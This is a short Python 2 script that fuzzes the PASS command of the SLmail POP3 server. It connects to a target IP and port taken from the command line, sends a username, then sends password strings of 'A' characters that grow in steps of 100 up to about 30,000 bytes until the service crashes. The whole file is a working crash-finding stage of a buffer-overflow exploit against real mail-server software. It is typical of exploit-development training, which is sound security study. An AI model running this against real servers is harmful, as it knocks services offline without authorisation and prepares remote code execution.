#!/usr/bin/python
import socket
import sys

test_crash_list = ["A"]
maximum_no_As = 3000
counter = 100

while len(test_crash_list) <= maximum_no_As:
	test_crash_list.append("A" * counter)
	counter = counter + 100

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

for crash_payload in test_crash_list:
	soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print "\nNow sending ", len(crash_payload), " bytes to see if SLmail crashes."

	soc.connect((server_ip, server_port))
	d = soc.recv(1024)

	soc.send('USER something' + '\r\n')
	d = soc.recv(1024)
	
	soc.send('PASS ' + crash_payload + '\r\n') # SLmail BO vulnerability is in the PASS command
	d = soc.recv(1024)

	soc.close()

	print "Done sending. SLmail did not crash yet."
